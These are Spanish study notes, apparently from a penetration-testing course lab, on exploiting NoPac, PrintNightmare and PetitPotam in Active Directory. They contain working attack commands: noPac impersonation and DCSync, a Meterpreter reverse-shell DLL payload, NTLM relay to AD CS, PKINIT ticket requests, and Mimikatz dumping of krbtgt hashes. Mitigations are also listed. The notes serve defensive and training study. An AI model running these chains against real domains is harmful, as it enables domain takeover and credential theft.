
## 1. Resumen general

En esta sección se estudian tres vulnerabilidades de Active Directory que pueden permitir la escalada de privilegios o el compromiso del dominio:

|Vulnerabilidad|CVE|Mecanismo|Acceso inicial requerido|
|---|---|---|---|
|**NoPac / SamAccountName Spoofing**|CVE-2021-42278 y CVE-2021-42287|Suplantación del nombre de una cuenta de equipo y abuso de Kerberos|Usuario de dominio estándar|
|**PrintNightmare**|CVE-2021-34527 y CVE-2021-1675|Explotación del servicio Print Spooler|Usuario de dominio estándar, según el escenario|
|**PetitPotam**|CVE-2021-36942|Forzar la autenticación NTLM de un controlador de dominio y retransmitirla a AD CS|Puede realizarse sin autenticación de dominio|

> **Importante:** las técnicas descritas corresponden al contexto histórico del módulo, publicado originalmente en 2022. Su explotación depende de los parches instalados, la configuración de Active Directory y las protecciones existentes.

# 2. NoPac — SamAccountName Spoofing

## 2.1. Concepto

NoPac, también conocido como **SamAccountName Spoofing** o _Sam The Admin_, combina dos vulnerabilidades:

- **CVE-2021-42278:** permite abusar de la gestión del atributo `sAMAccountName` de las cuentas de equipo.
    
- **CVE-2021-42287:** afecta a la validación del PAC de Kerberos en Active Directory Domain Services (AD DS).
    

El ataque puede permitir que un usuario de dominio estándar escale privilegios hasta obtener acceso como administrador de dominio.

### Flujo del ataque

1. Comprobar si el dominio es vulnerable.
    
2. Verificar el valor de `ms-DS-MachineAccountQuota`.
    
3. Crear una cuenta de equipo si se dispone de los permisos necesarios.
    
4. Cambiar temporalmente su `sAMAccountName` para suplantar el nombre de un controlador de dominio.
    
5. Abusar de Kerberos para obtener tickets que permitan suplantar una identidad privilegiada.
    
6. Obtener una shell con privilegios elevados o realizar un ataque DCSync.
    

Por defecto, los usuarios autenticados pueden añadir hasta **10 cuentas de equipo** al dominio. Si `ms-DS-MachineAccountQuota` está establecido en `0`, esta vía de creación de cuentas no estará disponible para un usuario que dependa de esa cuota.

## 2.2. Preparación de herramientas

El laboratorio utiliza una versión compatible de Impacket y el repositorio de NoPac.

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python setup.py install
```

Clonar el exploit:

```
git clone https://github.com/Ridter/noPac.git
cd noPac
```

En el laboratorio HTB, la herramienta está disponible en:

```
/opt/noPac
```

## 2.3. Comprobar si el dominio es vulnerable

Utilizar `scanner.py` para comprobar la vulnerabilidad:

```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 \
-dc-ip 172.16.5.5 -use-ldap
```

Indicadores importantes:

```
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

La obtención de los tickets en el escenario vulnerable indica que el ataque puede ser viable.

**Comprobaciones importantes:**

- Valor de `ms-DS-MachineAccountQuota`.
    
- Obtención de un TGT.
    
- Vulnerabilidad del controlador de dominio.
    
- Permisos para crear cuentas de equipo.
    

## 2.4. Obtener una shell SYSTEM

El ejemplo del módulo utiliza `noPac.py` para suplantar la cuenta `administrator` y abrir una shell seminteractiva:

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
-dc-ip 172.16.5.5 \
-dc-host ACADEMY-EA-DC01 \
-shell --impersonate administrator -use-ldap
```

La herramienta realiza las operaciones necesarias para crear la cuenta de equipo, manipular temporalmente su nombre, obtener los tickets y ejecutar el ataque.

En el escenario del módulo, se obtiene una shell:

```
C:\Windows\system32>
```

### Limitaciones de la shell

La shell utiliza `smbexec.py`, por lo que:

- Es seminteractiva.
    
- Es necesario utilizar rutas completas en lugar de depender de `cd` para navegar entre directorios.
    
- Puede generar alertas de antivirus o EDR.
    
- Los comandos pueden fallar si Windows Defender bloquea la ejecución.
    

## 2.5. Archivos de tickets Kerberos

NoPac puede guardar tickets en formato `.ccache` en el directorio desde el que se ejecuta.

Comprobar los archivos generados:

```
ls
```

Ejemplo del módulo:

```
administrator_DC01.INLANEFREIGHT.local.ccache
```

Estos archivos pueden utilizarse posteriormente para autenticarse mediante Kerberos, dependiendo de los permisos asociados a la identidad representada por el ticket.

**Importante:** los archivos `.ccache` contienen material de autenticación sensible. Deben protegerse y eliminarse cuando ya no sean necesarios.

## 2.6. Realizar DCSync con NoPac

El módulo muestra también una modalidad de NoPac que realiza un DCSync para recuperar los secretos de una cuenta específica:

```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
-dc-ip 172.16.5.5 \
-dc-host ACADEMY-EA-DC01 \
--impersonate administrator \
-use-ldap -dump \
-just-dc-user INLANEFREIGHT/administrator
```

En el resultado aparecen datos como:

```
inlanefreight.local\administrator:500:<LM_HASH>:<NT_HASH>:::
```

La herramienta utiliza el mecanismo DRSUAPI para obtener secretos de Active Directory.

**DCSync** permite solicitar material de credenciales mediante las interfaces de replicación del directorio. Para que funcione, la identidad utilizada debe disponer de los permisos de replicación necesarios.

# 3. PrintNightmare

## 3.1. Concepto

PrintNightmare hace referencia a dos vulnerabilidades relacionadas con el servicio **Print Spooler** de Windows:

- CVE-2021-34527.
    
- CVE-2021-1675.
    

Dependiendo de la vulnerabilidad concreta, la versión de Windows y sus protecciones, puede permitir escalada de privilegios local o ejecución remota de código.

En el escenario de HTB, se utiliza para obtener una shell con privilegios `SYSTEM` en un controlador de dominio Windows Server 2019.

## 3.2. Preparar el exploit

Clonar el repositorio utilizado por el módulo:

```
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

El exploit requiere la versión de Impacket de `cube0x0`, que puede diferir de la versión instalada habitualmente.

Repositorio de Impacket utilizado en el ejemplo:

```
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

En el laboratorio, estas herramientas ya están instaladas.

## 3.3. Enumerar los protocolos RPC

Utilizar `rpcdump.py` para comprobar si el objetivo expone los protocolos relacionados con la impresión:

```
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Ejemplo de resultado:

```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

La exposición de estos protocolos indica que están disponibles para la comunicación RPC, pero **no demuestra por sí sola que el sistema sea vulnerable**.

## 3.4. Flujo de explotación del laboratorio

El módulo demuestra el siguiente flujo:

1. Preparar un payload DLL para Windows.
    
2. Alojar el archivo en un recurso compartido SMB.
    
3. Configurar un listener para recibir la conexión inversa.
    
4. Ejecutar el exploit contra el objetivo.
    
5. Comprobar los privilegios de la sesión obtenida.
    

El ejemplo utiliza `msfvenom` para generar el payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

Después, el archivo se publica mediante un servidor SMB:

```
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Se configura un listener con Metasploit usando el payload correspondiente:

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

El módulo utiliza el exploit de `cube0x0` para acceder al recurso compartido y ejecutar el archivo DLL en el objetivo.

Si el ataque funciona, se recibe una sesión de Meterpreter y se puede abrir una shell de Windows.

## 3.5. Comprobar los privilegios

Dentro de la shell obtenida:

```
whoami
```

En el escenario vulnerable, el resultado es:

```
nt authority\system
```

Esto confirma que el proceso se ejecuta con privilegios `SYSTEM` en el host comprometido.

**Puntos clave:**

- La exposición de `MS-RPRN` o `MS-PAR` no garantiza la vulnerabilidad.
    
- La versión de Windows, los parches y las medidas de seguridad condicionan la explotación.
    
- El servicio Print Spooler puede verse afectado durante el ataque.
    
- La explotación puede generar alertas de seguridad o interrupciones del servicio.

# 4. PetitPotam — MS-EFSRPC

## 4.1. Concepto

PetitPotam, asociado en el módulo a **CVE-2021-36942**, abusa de funciones del protocolo remoto del Sistema de Archivos de Cifrado de Microsoft (**MS-EFSRPC**) para provocar una autenticación NTLM desde un host remoto.

El ataque puede utilizarse contra un controlador de dominio para forzar que se autentique frente a un sistema controlado por el atacante. Esa autenticación puede retransmitirse a otros servicios, especialmente a **Active Directory Certificate Services (AD CS)** cuando su configuración es vulnerable.

El impacto puede llegar al compromiso del dominio si se consigue obtener un certificado válido para la identidad del controlador de dominio y utilizarlo para solicitar un TGT de Kerberos.

## 4.2. Flujo del ataque

1. Identificar una instalación de AD CS vulnerable a retransmisión NTLM.
    
2. Configurar `ntlmrelayx.py` para retransmitir la autenticación a la página de inscripción web de la CA.
    
3. Utilizar PetitPotam para provocar la autenticación del controlador de dominio.
    
4. Retransmitir la autenticación a AD CS.
    
5. Obtener un certificado para la cuenta de equipo del controlador de dominio.
    
6. Utilizar el certificado para solicitar un TGT de Kerberos.
    
7. Aprovechar los permisos de replicación del controlador de dominio para realizar DCSync.
    

> PetitPotam no equivale automáticamente a un compromiso del dominio. El resultado depende de la configuración de NTLM, AD CS, las plantillas de certificados y las protecciones instaladas.

## 4.3. Configurar la retransmisión NTLM a AD CS

El módulo utiliza `ntlmrelayx.py` para dirigir la autenticación a la página de inscripción web de la CA.

Ejemplo del laboratorio:

```
sudo ntlmrelayx.py -debug -smb2support \
--target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp \
--adcs --template DomainController
```

Elementos importantes:

|Parámetro|Función|
|---|---|
|`-debug`|Muestra información adicional de depuración.|
|`-smb2support`|Habilita soporte SMB2.|
|`--target`|Especifica el servicio al que se retransmite la autenticación.|
|`--adcs`|Habilita el modo de ataque dirigido a AD CS.|
|`--template`|Indica la plantilla de certificado solicitada.|

En este escenario se utiliza la plantilla `DomainController`.

La plantilla y los permisos efectivos de AD CS son fundamentales para determinar si el ataque puede obtener un certificado aprovechable.

## 4.4. Provocar la autenticación con PetitPotam

En otra terminal, el módulo ejecuta:

```
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

Donde:

- `172.16.5.225`: host de ataque.
    
- `172.16.5.5`: controlador de dominio objetivo.
    

La herramienta intenta provocar la autenticación del controlador de dominio hacia el host de ataque.

Un indicador mostrado en el ejemplo es:

```
[+] Successfully bound!
[+] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

El mensaje `Attack worked!` indica que el mecanismo de activación produjo el resultado esperado por la herramienta; no garantiza que la retransmisión posterior ni la emisión del certificado hayan tenido éxito.

## 4.5. Obtener el certificado

Si la retransmisión funciona, `ntlmrelayx.py` muestra una autenticación exitosa y puede generar una solicitud de firma de certificado (CSR).

Los mensajes relevantes del ejemplo son:

```
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
```

La herramienta devuelve el certificado en formato **Base64**, asociado a la cuenta de equipo del controlador de dominio.

Este certificado puede utilizarse para solicitar un TGT mediante PKINIT.

**Nota:** un certificado Base64 obtenido durante la prueba es material de autenticación sensible y debe tratarse como una credencial.

# 5. Solicitar un TGT con PKINITtools

## 5.1. Solicitar el ticket

El módulo utiliza `gettgtpkinit.py` para solicitar un TGT para la cuenta de equipo a partir del certificado obtenido.

Ejemplo:

```
python3 /opt/PKINITtools/gettgtpkinit.py \
INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ \
-pfx-base64 '<CERTIFICADO_BASE64>' \
dc01.ccache
```

La herramienta utiliza el certificado y su clave privada para realizar la autenticación PKINIT y guarda el TGT en el archivo indicado.

En el ejemplo se obtiene también una clave de cifrado AS-REP, que puede ser necesaria para operaciones posteriores con PKINITtools.

## 5.2. Utilizar el archivo de caché Kerberos

Indicar a las herramientas Kerberos que utilicen el ticket guardado:

```
export KRB5CCNAME=dc01.ccache
```

Comprobar el ticket:

```
klist
```

El ejemplo muestra:

```
Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
```

Y un ticket de servicio:

```
krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

**Diferencia importante:**

- **TGT:** ticket que permite solicitar tickets de servicio.
    
- **TGS:** ticket destinado a acceder a un servicio concreto.
    
- **CCACHE:** formato de archivo utilizado para almacenar tickets Kerberos en sistemas compatibles.

# 6. DCSync utilizando el TGT del controlador de dominio

Los controladores de dominio poseen permisos de replicación de Active Directory. Si se obtiene una identidad de controlador de dominio y se puede utilizar su autenticación Kerberos, esos permisos pueden permitir realizar DCSync.

El módulo muestra la recuperación del hash de la cuenta `administrator` mediante `secretsdump.py`:

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
-k -no-pass \
"ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

En el ejemplo, `secretsdump.py` utiliza Kerberos y el archivo de caché para autenticarse.

La salida contiene información de credenciales, como:

```
inlanefreight.local\administrator:500:<LM_HASH>:<NT_HASH>:::
```

También pueden aparecer claves Kerberos de la cuenta.

## 6.1. Validar el acceso con el hash NTLM

El módulo muestra cómo comprobar la autenticación SMB mediante el hash obtenido:

```
crackmapexec smb 172.16.5.5 \
-u administrator \
-H '<NT_HASH>'
```

El resultado `Pwn3d!` del ejemplo indica que la autenticación tuvo éxito y que la herramienta detectó acceso privilegiado en ese host.

**Concepto clave:** el ataque no consiste simplemente en obtener un certificado. La cadena de explotación aprovecha la autenticación del controlador de dominio, sus privilegios de replicación y la posibilidad de utilizar la identidad obtenida mediante Kerberos.

# 7. Alternativa: obtener el hash NT con `getnthash.py`

PKINITtools incluye `getnthash.py`, que puede utilizar Kerberos U2U para solicitar un ticket dirigido a la propia identidad y recuperar su hash NT utilizando la clave de cifrado AS-REP.

El ejemplo del módulo es:

```
python /opt/PKINITtools/getnthash.py \
-key '<CLAVE_AS_REP>' \
INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

Si la operación tiene éxito, la herramienta muestra el hash NT recuperado.

El módulo utiliza ese hash para realizar DCSync mediante autenticación por hash:

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator \
"ACADEMY-EA-DC01$"@172.16.5.5 \
-hashes '<LM_HASH>:<NT_HASH>'
```

Esta alternativa requiere que se cumplan las condiciones de autenticación y compatibilidad de la técnica. El hash obtenido debe tratarse como una credencial sensible.

# 8. Alternativa en Windows: Rubeus y Pass-the-Ticket

El módulo presenta otra opción para trabajar desde un host Windows con Rubeus.

Se puede utilizar el certificado Base64 obtenido mediante la retransmisión a AD CS para solicitar un TGT e importarlo a la sesión actual.

Ejemplo del módulo:

```
.\Rubeus.exe asktgt `
/user:ACADEMY-EA-DC01$ `
/certificate:<CERTIFICADO_BASE64> `
/ptt
```

### Parámetros importantes

|Parámetro|Función|
|---|---|
|`asktgt`|Solicita un TGT.|
|`/user`|Especifica la identidad para la que se solicita el ticket.|
|`/certificate`|Proporciona el certificado utilizado en la autenticación PKINIT.|
|`/ptt`|Importa el ticket obtenido en la sesión de inicio de sesión actual.|

Comprobar los tickets en memoria:

```
klist
```

Si la operación funciona, aparecerá un TGT para la cuenta de equipo del controlador de dominio.

Como esa identidad dispone de privilegios de replicación en el escenario del módulo, puede utilizarse para realizar DCSync mediante Mimikatz:

```
lsadump::dcsync /user:inlanefreight\krbtgt
```

El resultado incluye el hash NTLM de la cuenta `krbtgt`.

Este hash tiene especial relevancia porque puede utilizarse en ataques posteriores relacionados con Golden Tickets. Su recuperación representa un compromiso crítico del dominio.

# 9. Mitigaciones

## 9.1. NoPac

- Aplicar las actualizaciones de seguridad correspondientes a CVE-2021-42278 y CVE-2021-42287.
    
- Revisar el valor de `ms-DS-MachineAccountQuota`.
    
- Establecer la cuota en `0` cuando el entorno no necesite que los usuarios creen cuentas de equipo.
    
- Supervisar la creación de cuentas de equipo y los cambios sospechosos de `sAMAccountName`.
    
- Vigilar solicitudes Kerberos anómalas y comportamientos relacionados con la suplantación de identidades.
    

Establecer `ms-DS-MachineAccountQuota` en `0` reduce esta vía concreta, pero no sustituye a la aplicación de los parches.

## 9.2. PrintNightmare

- Aplicar los parches de seguridad correspondientes.
    
- Revisar si el servicio Print Spooler necesita estar habilitado en cada sistema.
    
- Restringir la exposición de los servicios de impresión cuando no sean necesarios.
    
- Supervisar comportamientos anómalos relacionados con RPC, carga de controladores de impresión y ejecución de archivos DLL.
    
- Revisar las alertas de antivirus y EDR.
    

## 9.3. PetitPotam y AD CS

Las medidas de mitigación descritas en el módulo incluyen:

1. Aplicar el parche correspondiente a CVE-2021-36942.
    
2. Habilitar **Extended Protection for Authentication (EPA)** para reducir el riesgo de retransmisión NTLM.
    
3. Requerir SSL/TLS para los servicios web de inscripción de certificados.
    
4. Deshabilitar NTLM para los controladores de dominio cuando sea viable.
    
5. Deshabilitar NTLM en los servidores AD CS mediante las políticas correspondientes.
    
6. Revisar y restringir la autenticación NTLM en IIS cuando se utilicen los servicios web de inscripción.
    
7. Auditar las plantillas de certificados y los permisos de inscripción.
    

**Importante:** aplicar únicamente el parche de PetitPotam no elimina todos los posibles ataques contra AD CS. También es necesario revisar la configuración de los servicios de certificados, sus plantillas y los mecanismos de autenticación.

# 10. Chuleta de repaso

|Técnica|Qué buscar|Herramientas del módulo|Resultado potencial|
|---|---|---|---|
|NoPac|Vulnerabilidad de Kerberos y cuota de cuentas de equipo|`scanner.py`, `noPac.py`|Suplantación privilegiada, shell SYSTEM o DCSync|
|PrintNightmare|Exposición de RPC de impresión y vulnerabilidad del servicio|`rpcdump.py`, exploit de `cube0x0`, `msfvenom`|Ejecución remota de código y shell SYSTEM|
|PetitPotam|Autenticación NTLM forzada y AD CS vulnerable a retransmisión|`PetitPotam.py`, `ntlmrelayx.py`|Certificado para la cuenta del DC|
|PKINIT|Certificado válido para una identidad de dominio|`gettgtpkinit.py`, Rubeus|TGT de Kerberos|
|Pass-the-Ticket|Ticket Kerberos válido en caché o memoria|`KRB5CCNAME`, `klist`, Rubeus|Autenticación como la identidad del ticket|
|DCSync|Permisos de replicación del directorio|`secretsdump.py`, Mimikatz|Recuperación de hashes y claves Kerberos|

## Ideas que debes recordar para el examen

- **NoPac combina CVE-2021-42278 y CVE-2021-42287.**
    
- `ms-DS-MachineAccountQuota` controla cuántas cuentas de equipo pueden crear determinados usuarios del dominio.
    
- **PrintNightmare** afecta al servicio Print Spooler y puede permitir ejecución remota de código o escalada de privilegios, dependiendo del escenario.
    
- **PetitPotam** fuerza una autenticación NTLM mediante MS-EFSRPC; su retransmisión a AD CS puede permitir obtener un certificado para el controlador de dominio.
    
- Un certificado aprovechable puede utilizarse mediante PKINIT para solicitar un TGT.
    
- `KRB5CCNAME` permite especificar qué archivo de caché Kerberos utilizarán las herramientas compatibles.
    
- `klist` permite comprobar los tickets Kerberos disponibles.
    
- **DCSync** aprovecha permisos de replicación de Active Directory para recuperar secretos de cuentas.
    
- La cuenta `krbtgt` es especialmente importante por su relación con la emisión de tickets Kerberos y los ataques Golden Ticket.
    
- Un ataque puede tener éxito técnicamente y, aun así, generar alertas, dejar archivos de autenticación en disco o interrumpir servicios.
    

**Flujo de ataque que debes saber explicar:**

`PetitPotam → Autenticación NTLM forzada → NTLM relay a AD CS → Certificado del DC → PKINIT → TGT → DCSync → Hashes del dominio`
